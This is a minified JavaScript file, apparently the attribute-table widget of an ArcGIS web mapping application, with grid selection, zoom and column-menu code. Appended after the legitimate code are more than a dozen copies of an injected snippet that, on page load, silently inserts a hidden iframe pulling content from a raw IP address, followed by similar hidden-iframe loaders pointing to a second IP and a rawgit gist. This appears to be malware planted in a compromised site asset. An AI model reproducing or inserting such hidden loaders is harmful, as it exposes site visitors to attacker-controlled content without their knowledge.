g.create("div",{"class":"dgrid-status self-footer",innerHTML:c+"\x26nbsp;"+(this.layerInfo.isTable?this.nls.records:this.nls.features)+"\x26nbsp;"},this.footer);this.selectedRowsLabel=g.create("div",{"class":"dgrid-status self-footer",innerHTML:"0\x26nbsp;"+this.nls.selected+"\x26nbsp;",style:{display:this.layer.objectIdField?"":"none"}},c,"after");c=g.getStyle(this.domNode,"height");this.changeHeight(c);this._requestStatus="fulfilled";this.tableCreated=!0;g.place(this.loading.domNode,this.grid.domNode);
this.loading.hide()},getSelectedRowsData:function(){var a=new q,b=this._getTableSelectedIds()||[];if(!this.grid||!b.length)return a.resolve(null),a;this.grid.store instanceof r?(b=d.clone(this.grid.store.data),a.resolve(b)):this.grid.store.query(b,{_export_count:b.length}).then(d.hitch(this,function(b){b=b&&d.clone(this.grid.store._entityData||this.grid.store.data);a.resolve(b)}));return a},_appendXY:function(a){a&&"esriGeometryPoint"===this.layer.geometryType&&l.forEach(a,function(a){var b=a.geometry;
b&&"point"===b.type&&("x"in a?a._x=b.x:a.x=b.x,"y"in a?a._y=b.y:a.y=b.y);delete a.geometry})},getOutFields:function(a){var b=null,b=this._getOutFieldsFromLayerInfos(this.layer.objectIdField),b=this._processExecuteFields(this.layer.fields,b),b=d.clone(b);a&&(a="",a=-1!==b.indexOf("x")?"_x":"x",b.push({name:a,alias:a,format:{digitSeparator:!1,places:6},show:!0,type:"esriFieldTypeDouble"}),a=-1!==b.indexOf("y")?"_y":"y",b.push({name:a,alias:a,format:{digitSeparator:!1,places:6},show:!0,type:"esriFieldTypeDouble"}));
return b},setSelectedNumber:function(){if(this.selectedRowsLabel&&this.grid){var a=this.getSelectedRows(),b=0;if(this.grid.store instanceof r){var c=l.map(this.grid.store.data,function(a){return a[this.layer.objectIdField]},this);l.forEach(a,function(a){-1<c.indexOf(a)&&b++})}else b=a.length;this.selectedRowsLabel.innerHTML="\x26nbsp;\x26nbsp;"+b+" "+this.nls.selected+"\x26nbsp;\x26nbsp;"}},_setSelection:function(a){this._selectionResults=a=a||[];this.selectionManager.setSelection(this.layer,a)},
_zoomToExtentByFeatures:function(a){return this.getExtent(a).then(d.hitch(this,function(a){if(a&&this.domNode){var b=null;if("point"===a.type){var e=this.map.getNumLevels(),d=this.map.getLevel(),b=this.map.getMaxZoom();0<e?(d===b?e=d:(e=d+4,e>b&&(e=b)),b=this.map.centerAndZoom(a,e)):b=this.map.centerAndZoom(a,1/Math.pow(2,4)*2)}else b=this.map.setExtent(a.expand(2));return b.then(function(){return a})}}))},_showMapInfoWindowByFeatures:function(a,b){if(b&&0!==b.length&&this.domNode){var c=this.map.infoWindow,
e=this.layerInfo.isPopupEnabled()&&this.layerInfo.getInfoTemplate();if(c&&c.setFeatures&&1===b.length&&e){l.forEach(b,d.hitch(this,function(a){a._layer=this.layerInfo.layerObject;a.setInfoTemplate(e)}));c.setFeatures(b);var f=null,f="point"===a.type?b[0].geometry:a.getCenter();c.show(f,{closetFirst:!0});this._dblClickResult=b[0];this.syncWithMapInfowindow(this._dblClickResult)}}},selectFeatures:function(a,b){b&&0<b.length?("rowclick"===a||"selectall"===a?this._setSelection(b):"zoom"!==a&&"row-dblclick"!==
a||this._zoomToExtentByFeatures(b).then(d.hitch(this,function(c){"row-dblclick"===a&&this.domNode&&this._showMapInfoWindowByFeatures(c,b)}),d.hitch(this,function(a){a&&"Request canceled"!==a.message&&console.error(a)})),this.setSelectedNumber()):this._popupMessage(this.nls.dataNotAvailable)},syncWithMapInfowindow:function(a){var b=this.map.infoWindow,c=d.isArray(a)?a:[a];m.once(b,"hide",d.hitch(this,function(){e&&e.remove&&(e.remove(),e=null)}));var e=aa.after(b,"show",d.hitch(this,function(){var a=
b.getSelectedFeature(),a=a&&c[0]===a,d=-1;b.features&&(d=b.features.indexOf(c[0]));!a&&-1<d?b.select(d):this.domNode&&!a&&e&&e.remove&&(e.remove(),e=null)}))},getGraphicsFromLocalFeatureLayer:function(a){for(var b=[],c,e,d=a.length,h=this.layer.graphics.length,g=this.layer.objectIdField,l=0;l<d;l++)for(var m=0;m<h;m++)if(c=this.layer.graphics[m].attributes[g]+"",e=a[l]+"",c===e){b.push(this.layer.graphics[m]);break}return b},getExtent:function(a){var b=new q,c,e,f=a.length;if(1===f&&a[0].geometry&&
"point"===a[0].geometry.type)c=a[0].geometry;else if(1!==f||a[0].geometry)for(var h=0;h<f;h++)a[h].geometry?"point"===a[h].geometry.type?(e||(e=new W(a[h].geometry.spatialReference)),e.addPoint(a[h].geometry),h===f-1&&(c=e.getExtent())):c=c?c.union(a[h].geometry.getExtent()):a[h].geometry.getExtent():console.error("unable to get geometry of the reocord: ",a[h]);else return b.reject(Error("AttributeTable.getExtent:: extent was not projected.")),b;if(!c||!c.spatialReference)return b.reject(Error("AttributeTable.getExtent:: extent was not projected.")),
b;a=this.map.spatialReference;c.spatialReference.equals(a)?b.resolve(c):(e=new V,e.geometries=[c],e.outSR=a,z.defaults.geometryService.project(e,d.hitch(this,function(a){this.domNode&&(a&&a.length?b.resolve(a[0]):b.reject(Error("AttributeTable.getExtent:: extent was not projected.")))}),d.hitch(this,function(a){a||(a=Error("AttributeTable.getExtent:: extent was not projected."));b.reject(a)})));return b},_onFeaturelayerClick:function(a,b){if(this.actived){var c=d.getObject("graphic",!1,a),e=d.getObject("graphic.attributes",
!1,a);e&&c&&c._layer===this.layer&&((c=this.map.infoWindow.getSelectedFeature())&&c._layer===this.layer&&!b&&this.map.infoWindow.hide(),b=e[this.layer.objectIdField],this.showSelected&&this.toggleSelectedRecords(),this._getIndexOfIdInGrid(b).then(d.hitch(this,function(b){-1!==b&&(this.grid.scrollTo({x:0,y:this.grid.rowHeight*b}),this.map.infoWindow.features&&(b=this.map.infoWindow.features.indexOf(a.graphic),this.map.infoWindow.select(b)),m.once(this.map.infoWindow,"selection-change",d.hitch(this,
function(){var b=this.map.infoWindow.getSelectedFeature(),c=d.getObject("_layer",!1,b);b!==a.graphic&&c===this.layer&&this._onFeaturelayerClick({graphic:b},!0)})),this.syncWithMapInfowindow(a.graphic))})))}},_getIndexOfIdInGrid:function(a){var b=new q,c=-1,e=d.getObject("store.objectIds",!1,this.grid),c=null,c=this.grid.get("sort")[0];if(this._relatedQuery)return b.resolve(-1),b;if(this.grid.store instanceof r)a=this.grid.store.get(a),e=this.grid.store.data,a?c&&c.attribute&&n.isDefined(c.descending)?
(e=d.clone(e),c=function(a,b){return function(c,e){return c[a]===e[a]?0:c[a]<e[a]?b?1:-1:b?-1:1}}(c.attribute,c.descending),e.sort(c),e=l.map(e,function(a){return a[this.layer.objectIdField]},this),c=e.indexOf(a[this.layer.objectIdField])):c=e.indexOf(a):c=-1,b.resolve(c);else if(e&&0<e.length)c=e.indexOf(a),b.resolve(c);else{e=new t;e.returnGeometry=!1;e.where=this._getLayerFilterExpression()+" AND "+this.layer.objectIdField+" \x3c "+a;if(c&&(c.attribute!==this.layer.objectIdField||c.descending))return b.resolve(-1),
b;this.matchingMap&&!this._relatedQuery&&this._currentExtent&&(e.geometry=this._currentExtent);(this._currentDef=this.layer.queryCount(e)).then(d.hitch(this,function(a){b.resolve(a)}),d.hitch(this,function(a){b.reject(a)}))}return b},_zoomToSelected:function(){if(this.configedInfo&&this.tableCreated){var a=this.getSelectedRows();this._goToFeatures(a,"zoom")}},_goToFeatures:function(a,b){if(0!==a.length){var c=this.getGraphicsFromLocalFeatureLayer(a);this.isSupportQueryToServer()&&a.length!==c.length?
this._queryFeaturesByIds(a,b):this.selectFeatures(b,c)}},_onDblclickRow:function(a){this.layerInfo&&this.layerInfo.isShowInMap()&&(a=[this.grid.row(a).id],this._goToFeatures(a,"row-dblclick"))},_queryFeaturesByIds:function(a,b){var c=new t;c.objectIds=a;c.returnGeometry=!0;c.outSpatialReference=d.clone(this.map.spatialReference);c.outFields=["*"];a=this.layer;var e="esri.layers.CSVLayer"===a.declaredClass;a.url&&!e?(new u(a.url)).execute(c,d.hitch(this,function(a){this.selectFeatures(b,a.features)}),
d.hitch(this,this._errorSelectFeatures)):a.selectFeatures(c,D.SELECTION_NEW,d.hitch(this,this.selectFeatures,b),d.hitch(this,this._errorSelectFeatures))},_onHeaderClick:function(a){var b=this.grid.cell(a);this._showColumnMenu(b.column,b,a.target,{x:a.pageX,y:a.pageY})},_showColumnMenu:function(a,b,c,e){var f=d.getObject("_cache",!1,a);if(f){var h=new L({});g.addClass(h.domNode,"jimu-widget-attributetable-feature-menu");var k=this;if(f.sortable){var n=["iconSortAscending","iconSortDescending"];l.forEach([this.nls.sortAsc,
this.nls.sortDes],function(b,c){b=new p({label:b,iconClass:n[c],baseClass:"menuItemClass",onClick:function(){0===c?k.grid.set("sort",a.field,!1):1===c&&k.grid.set("sort",a.field,!0)}});h.addChild(b)})}f.statistics&&(f=new p({label:this.nls.statistics,iconClass:"iconTableStatistics",baseClass:"menuItemClass",onClick:d.hitch(this,function(){var b={layer:this.layer,filterExpression:this._getLayerFilterExpression(),fieldNames:[a.field]};this.matchingMap&&(b.geometry=this._currentExtent);if(this.showSelected){var c=
this._getSelectedIds();b.filterExpression+=" AND "+this.layer.objectIdField+" IN ("+c.join()+")"}else this.queryByStoreObjectIds&&0<this.queryByStoreObjectIds.length&&(b.filterExpression+=" AND "+this.layer.objectIdField+" IN ("+this.queryByStoreObjectIds.join()+")");this.fieldStatistics=new ca;this.fieldStatistics.showContentAsPopup(b)})}),h.addChild(f));f=h.getChildren();h.startup();h._openMyself({target:c,delegatedTarget:b,iframe:null,coords:e});this.own(m(h,"Close",d.hitch(this,function(){var a=
this.get("columnMenu");a&&(a.destroyRecursive(),this.set("columnMenu",null))})));this.set("columnMenu",h);1>f.length&&m.emit(h,"Close")}},_onColumnStateChange:function(a){if(a&&a.grid&&a.grid.columns){var b=0,c;for(c in a.grid.columns)a.grid.columns[c].hidden||b++;20+100*b-1<g.getMarginBox(this.domNode).w?g.addClass(this.domNode,"auto-width"):g.removeClass(this.domNode,"auto-width")}},_onSelectionHandleClick:function(){var a=this._getSelectedIds();this.selectionRows=a;this._closePopup();this.layerInfo.isTable||
(0<a.length?this._goToFeatures(a,"rowclick"):this._setSelection([]));this.setSelectedNumber();this.emit("row-click",{table:this,selectedIds:a})},_onExtentChange:function(a){var b=d.getObject("delta.x",!1,a),c=d.getObject("delta.y",!1,a);a=this._clickMap&&!a.levelChange?isFinite(b)&&isFinite(c)&&(0<Math.abs(b)||0<Math.abs(c)):!0;this._clickMap=!1;a&&this.matchingMap&&this.actived&&this.layerInfo&&!this.layerInfo.isTable&&this.startQuery(this.queryByStoreObjectIds)},_getLayerFilterExpression:function(){var a=
this.layerInfo.getFilter();return a?a:"1\x3d1"},_getOutFieldsFromLayerInfos:function(a){var b=this.configedInfo.layer.fields,c=[];b&&l.forEach(b,d.hitch(this,function(b){n.isDefined(b.show)||(b.show=!0);b.name!==a||"esriFieldTypeOID"!==b.type&&"esriFieldTypeInteger"!==b.type&&b.type||(b._pk=!0);(b.show||b._pk)&&c.push(b)}));return c},_processExecuteFields:function(a,b){if(a&&0<a.length){var c=[];if(!b.length)return a;for(var e=0,f=b.length;e<f;e++)for(var g=0;g<a.length;g++)b[e].name!==a[g].name||
b[e].type!==a[g].type&&b[e].type||(a[g]=d.mixin(a[g],b[e]),c.push(a[g]));return c}return b},_getSelectedIds:function(){var a=[],b=this.grid.selection,c;for(c in b)b[c]&&(isFinite(c)?a.push(parseInt(c,10)):a.push(c));return a},_getTableSelectedIds:function(){var a=[],b=this.getSelectedRows();if(this.grid)if(this.grid.store instanceof r){var c=l.map(this.grid.store.data,function(a){return a[this.layer.objectIdField]},this);l.forEach(b,function(b){-1<c.indexOf(b)&&a.push(parseInt(b,10))})}else a=b;return a},
isSelectionMode:function(){var a=this.getSelectedRows();return this.tableCreated&&a&&0<a.length&&this.layer&&this.layer.objectIdField?!0:!1},_errorSelectFeatures:function(a){console.error(a)},_popupMessage:function(a){var b=new x({message:a,buttons:[{label:this.nls.ok,onClick:d.hitch(this,function(){b.close()})}]});this.loading.hide()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});